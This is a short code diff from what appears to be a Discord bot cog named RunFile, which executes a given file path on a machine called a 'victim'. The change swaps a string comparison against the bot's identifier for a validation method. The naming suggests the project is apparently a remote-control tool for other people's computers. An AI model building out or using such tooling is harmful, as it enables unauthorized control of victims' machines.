@@ -19,7 +19,7 @@ class RunFile(commands.Cog):
         file_path: Path of the file for executing.
         """
         
-        if str(victim) == str(self.bot.identifier):
+        if self.valid(victim):
         
             if os.path.isfile(file_path):
             
